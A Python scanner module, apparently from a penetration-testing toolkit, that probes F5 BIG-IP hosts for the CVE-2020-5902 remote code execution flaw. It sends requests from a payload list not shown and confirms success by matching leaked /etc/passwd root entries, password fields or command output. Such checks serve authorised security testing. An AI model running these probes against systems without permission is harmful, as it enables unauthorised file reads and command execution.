#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
import re

def cve_2020_5902_scan(self, url):
    ''' F5-BIG-IP 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞;
        未授权的远程攻击者通过向该页面发送特制的请求包, 可以造成任意Java 代码执行;
        进而控制 F5 BIG-IP 的全部功能, 包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2020-5902'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2020_5902_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if (('encrypted-password' in res.text) 
                or ('partition-access' in res.text) 
                or (('"output": "' in res.text) and ('"error": "",' in res.text)) 
                or re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                    or (('Microsoft Corp' in res.text) 
                        and ('Microsoft TCP/IP for Windows' in res.text))
                ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
